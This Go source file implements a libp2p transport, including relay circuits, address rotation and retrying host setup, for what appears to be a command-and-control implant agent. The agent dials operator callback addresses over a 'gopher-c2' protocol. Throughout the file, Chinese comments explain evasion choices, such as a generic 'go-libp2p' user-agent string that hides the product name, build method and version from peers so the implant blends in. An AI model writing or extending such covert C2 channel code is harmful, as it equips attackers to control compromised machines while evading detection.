//go:build libp2p

package main

// Phase5 §4 步骤 4：libp2p 传输的**真实现**（只在 `-tags libp2p` 时编入）。
//
// ★ 为什么用 build tag（§4.2）：agent 是**每次生成时现编**的（pl_main.go:506-536），
//   若无条件 import libp2p，则每一次 e2e.gen_agent() 都要付 60–90s 构建 + 预热模块缓存，
//   而 gen_agent 被**全部 23 项**门禁调用 ⇒ 整个门禁的时序面受威胁。带 tag 时默认产物里
//   连一个 libp2p 字节都没有。
//
// ★ 抽象面直接用 net.Conn（§2.4）：`gostream.Dial` 返回的正是 net.Conn ⇒ 下游
//   （`functions.ConnRead/SendMsg/RecvMsg`、`main.go:202-227` 的帧循环）**零改动**。
//   注意 `network.Stream` **不满足** net.Conn（缺地址方法），所以必须走 gostream。

import (
	"context"
	"errors"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/libp2p/go-libp2p"
	libcrypto "github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/protocol"
	"github.com/libp2p/go-libp2p/p2p/muxer/yamux"
	"github.com/libp2p/go-libp2p/p2p/net/gostream"
	"github.com/libp2p/go-libp2p/p2p/security/noise"
	"github.com/libp2p/go-libp2p/p2p/transport/tcp"
	ma "github.com/multiformats/go-multiaddr"

	"gopher/utils"
)

// defaultLibp2pProtocol 是 C2 流所用的 protocol id；profile 可覆盖。
const defaultLibp2pProtocol = "/gopher/1.0.0"

// defaultLibp2pDialTimeout 是建连 + 开流的**总**预算。
// ★ 刻意远离 §4 步骤 5 那个 200ms：libp2p 要握手（Noise）+ 选路，1–5s 是常态。
const defaultLibp2pDialTimeout = 30 * time.Second

// axLibp2pUserAgent 是 identify 协议报出的 agentVersion（= libp2p 的 user-agent）。
//
// 为什么必须显式设：libp2p 的默认值不是固定串，而是
// `fmt.Sprintf("%s@%s", bi.Main.Path, 版本|revision)`
// （p2p/protocol/identify/user_agent.go:20/:39）—— bi.Main 是**编译该二进制的模块本身**。
// 本 agent 实测 Main.Path = "gopher"（src_gopher/go.mod 的 module 名）+ 版本 "(devel)"
// + 非 git 仓库（revision 恒空）⇒ 默认值 = "gopher@" —— 既**写出产品名**，又是生态里
// 不存在的畸形串（以 @ 结尾且 revision 为空）。不设它 = 每次 identify 都向对端自报家门。
// ★ Main.Path 随**构建方式**而变，同一项目的不同部件报出**互不相同**的自曝串：builder
// 插件报它的模块名、plugin 对文件列表直接编译时报 "command-line-arguments@" —— 对端据此
// 甚至能区分对方是哪个部件。静态读某一枚产物的 `go version -m` 只能得到那一种值。
//
// 取值纪律（三处生产代码必须**逐字节相同**，由 l2p_uafix.py verify 判）：
// ① 用**主流前缀** go-libp2p，混进生态人群，不制造本项目独有特征；
// ② **不带版本号**：版本号是对端反查已知漏洞的线索；且本项目用的是 third_party
// 私有 replace 的 libp2p，报任何版本号都是**假信息**；
// ③ **不放产品名/构建方式**（adaptix / gopher / axc2 / command-line-arguments）。
// 刻意**不**伪装成别的实现（kubo/…、rust-libp2p/…）：冒充真实软件且行为不符，更可疑。
const axLibp2pUserAgent = "go-libp2p"

// host 在进程内**只成功建一次**并缓存：libp2p.New 要起后台 goroutine + 建连接管理器，
// 每次拨号都建一遍会比 dial 本身还贵（§4 步骤 4 的"并缓存"）。
// ★ M8④：缓存的是**成功**，不是"尝试过"。原先用 sync.Once 会把失败也永久缓存 ——
//   一次瞬时失败（agent 比网卡先起、内存瞬紧、私钥短暂不可读）就把这个进程的
//   libp2p 通道**终生**钉死，而重试**永远不会再发生**，现象只是"一直不上线"。
//   sync.Once 在这里是错的工具：它表达"只做一次"，我们要的是"只成功一次"。
var (
	hostMu   sync.Mutex
	hostInst host.Host
)

func libp2pHost(profile utils.Profile) (host.Host, error) {
	build := func() (host.Host, error) {
		opts := []libp2p.Option{
			// agent 是**拨号方**（§4.0）：不监听，也让链接器别把 listener 那套拉进来。
			libp2p.NoListenAddrs,
			libp2p.NoTransports,
			// ★★ 必须显式开 relay，且必须**在 NoTransports 之后**：
			//   NoTransports 见 RelayCustom==false 会顺手把 cfg.Relay 也置 false
			//   （options.go:436-438），而 cfg.Relay 才是装配 circuit 传输的开关
			//   （config/config.go:350）⇒ 少了这一行，agent 手里就算有
			//   /p2p-circuit 地址也**没有能解析它的传输**，且失败得很安静。
			libp2p.EnableRelay(),
			libp2p.Transport(tcp.NewTCPTransport),
			libp2p.Security(noise.ID, noise.New),
			libp2p.Muxer(yamux.ID, yamux.DefaultTransport),
			// ★ 批次8：identify 报出的 agentVersion。不设 ⇒ 默认值是 "<模块路径>@"
			//   （bi.Main.Path + 空 revision，非 git 构建下 revision 恒空）。★ 交付的
			//   这枚 agent 实测 Main.Path="gopher" ⇒ 默认值就是 "gopher@" 这个自曝串。
			libp2p.UserAgent(axLibp2pUserAgent),
		}
		if len(profile.Libp2pPrivKey) > 0 {
			sk, err := libcrypto.UnmarshalPrivateKey(profile.Libp2pPrivKey)
			if err != nil {
				// ★ 不静默降级成临时身份：那会让"服务端认不出这个 agent"变成一个
				//   无从查起的神秘现象。宁可这里就报错。
				return nil, fmt.Errorf("libp2p: unmarshal privkey: %w", err)
			}
			opts = append(opts, libp2p.Identity(sk))
		}
		// Libp2pPrivKey 为空 ⇒ libp2p 自生成临时身份。对**拨号方**这是可接受的
		// （每次运行 peer id 不同，与 TCP 源端口随机同类），服务端按对方给的 peer id 记账。
		return libp2p.New(opts...)
	}

	// ★ 锁在整个 build 期间持有 —— 与 sync.Once 的**阻塞语义**保持一致：并发拨号时
	//   只建一个 host，其余在锁上等。区别只在于失败后锁被释放，下次可以重来。
	//   ★ 没有这一步，"只成功一次"就退化成"每次都重建"：hostMu 声明了却从不使用，
	//     而 Go 对**包级**变量的未使用是静默的（不像局部变量会编译错）——
	//     这处 bug 是我在 apply 后逐行读 diff 才发现的，gofmt 与编译都不会报。
	hostMu.Lock()
	defer hostMu.Unlock()
	if hostInst != nil {
		return hostInst, nil
	}
	// ★ 失败**不写** hostInst ⇒ 下一次拨号重新尝试建 host。重复建 host 的代价只在
	//   "一直失败"时才付出，而那正是需要重试的场景。
	h, err := build()
	if err != nil {
		return nil, fmt.Errorf("libp2p: new host: %w", err)
	}
	hostInst = h
	return hostInst, nil
}

// dialLibp2p 建 host → Connect → gostream.Dial，返回一个满足 net.Conn 的流。
//
// 地址来源：优先 `profile.Libp2pAddrs`（多地址，逐个试），为空则退回调用点传进来的
// `addr` —— 这样 operator 也可以直接把 multiaddr 填在普通的 callback_addresses 里。
func dialLibp2p(profile utils.Profile, addr string) (net.Conn, error) {
	h, err := libp2pHost(profile)
	if err != nil {
		return nil, err
	}

	addrs := profile.Libp2pAddrs
	if len(addrs) == 0 && addr != "" {
		addrs = []string{addr}
	}
	if len(addrs) == 0 {
		return nil, errors.New("libp2p: profile has neither l2p_addrs nor callback_addresses")
	}
	// ★ S7：main.go 的 addrIndex 轮转对 libp2p 曾**完全失效** —— 调用方把轮到的地址
	//   传进来，这里却总是从 addrs[0] 开始试，那个参数被算出来又丢掉。而 libp2p
	//   profile 下 Addresses 与 Libp2pAddrs 是同一个切片（见 pl_main.go），所以
	//   "轮转"在源码上看着是通的，行为上却是每个 agent 永远先打第一个地址。
	//   把调用方选中的地址转到队首，其余保持原序作兜底。
	addrs = axPutFirst(addrs, addr)

	proto := protocol.ID(profile.Libp2pProtocol)
	if profile.Libp2pProtocol == "" {
		proto = defaultLibp2pProtocol
	}
	timeout := time.Duration(profile.Libp2pDialTimeout) * time.Second
	if timeout <= 0 {
		timeout = defaultLibp2pDialTimeout
	}

	// 逐个地址试，与 main.go 的 addrIndex 轮询同构；全部失败才返回最后一个错。
	var lastErr error
	for _, s := range addrs {
		maddr, err := ma.NewMultiaddr(s)
		if err != nil {
			lastErr = fmt.Errorf("libp2p: bad multiaddr %q: %w", s, err)
			continue
		}
		ai, err := peer.AddrInfoFromP2pAddr(maddr)
		if err != nil {
			lastErr = fmt.Errorf("libp2p: no peer id in %q: %w", s, err)
			continue
		}
		ctx, cancel := context.WithTimeout(context.Background(), timeout)
		if err := h.Connect(ctx, *ai); err != nil {
			cancel()
			lastErr = err
			continue
		}
		// ★★ 经 relay 时**必须**带 WithAllowLimitedConn（批次5 实测）：
		//   circuit 连接是 Limited 连接，swarm.NewStream 默认拒绝在它上面开流、
		//   转去 waitForDirectConn 等一条永远不会来的直连（swarm.go:508-515）
		//   ⇒ Connect 成功、identify 成功、业务流永远开不出来，挂到 ctx 超时。
		//   libp2p 自家的 ping/identify/holepunch 都加了，gostream.Dial 没有。
		conn, err := gostream.Dial(
			network.WithAllowLimitedConn(ctx, "gopher-c2"), h, ai.ID, proto)
		cancel()
		if err != nil {
			lastErr = err
			continue
		}
		return conn, nil
	}
	return nil, fmt.Errorf("%w [%s]", lastErr, axLibp2pBuildTag)
}
// axPutFirst 把 addr 转到队首，其余保持原序。
// ★ 阴性样本：addr 为空 / 不在 addrs 里 / addrs 只有一个元素时**原样返回** ——
//   前两种情况若"顺手"把 addr 塞进去，就等于凭空多打一个可能非法的地址。
func axPutFirst(addrs []string, addr string) []string {
	if addr == "" || len(addrs) < 2 {
		return addrs
	}
	for i, s := range addrs {
		if s != addr {
			continue
		}
		if i == 0 {
			return addrs
		}
		out := make([]string, 0, len(addrs))
		out = append(out, addrs[i:]...)
		out = append(out, addrs[:i]...)
		return out
	}
	return addrs
}

// axLibp2pBuildTag 是**被 `-tags libp2p` 编进来**的构建指纹（B-B1 的硬门）。
// pl_main.go 在构建后直接扫产物字节：带 tag 的产物必须含它、且不含替身那一枚；
// 不带 tag 的必须反过来。★ 它必须真的被引用，否则包级常量会被链接器消掉 ——
// 所以它出现在 dialLibp2p 最后那个错误串里。
// ★ 跨文件耦合：pl_main.go 的 axTagLibp2p 必须与这里逐字符相同。
const axLibp2pBuildTag = "axc2:l2p:enabled:v1"
